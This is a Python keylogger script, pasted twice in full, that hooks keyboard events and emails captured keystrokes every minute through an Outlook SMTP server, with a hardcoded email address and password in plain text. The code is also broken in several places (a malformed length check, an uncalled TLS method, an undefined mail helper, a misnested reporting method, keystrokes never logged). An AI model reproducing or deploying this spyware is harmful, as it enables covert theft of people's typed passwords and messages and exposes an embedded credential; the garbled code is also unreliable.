import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = "armaan20241@outlook.com"
EMAIL_PWD = "Solera14"


class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    def callback (self, event):
        name = event.name
        if len.name > 1:
            if name == "space":
                name = " "
        elif name == "enter":
            name = "[ENTER]\n"
        elif name == "decimal":
            name = "."
    def prepare_message(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger Keys"
        html = f"<p>{message}</p>"
        html_part = MIMEText(html, "html")
        return msg.as_string()
    def sendmail(self, email, password, message, verbose=1):
        server = smtplib.SMTP(host="smtp.live.com", port=587)
        server.starttsl
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing: {message}")
        def report(self):
            if self.log:
                # if there is something in log, report it
                self.end_dt = datetime.now()
                # update `self.filename`
                self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PWD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
                print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()
    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread,wait unit CTRL+C is pressed
        keyboard.wait()
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY,report_method="email")
    keylogger.start()import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = "armaan20241@outlook.com"
EMAIL_PWD = "Solera14"


class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    def callback (self, event):
        name = event.name
        if len.name > 1:
            if name == "space":
                name = " "
        elif name == "enter":
            name = "[ENTER]\n"
        elif name == "decimal":
            name = "."
    def prepare_message(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger Keys"
        html = f"<p>{message}</p>"
        html_part = MIMEText(html, "html")
        return msg.as_string()
    def sendmail(self, email, password, message, verbose=1):
        server = smtplib.SMTP(host="smtp.live.com", port=587)
        server.starttsl
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing: {message}")
        def report(self):
            if self.log:
                # if there is something in log, report it
                self.end_dt = datetime.now()
                # update `self.filename`
                self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PWD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
                print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()
    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread,wait unit CTRL+C is pressed
        keyboard.wait()
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY,report_method="email")
    keylogger.start()
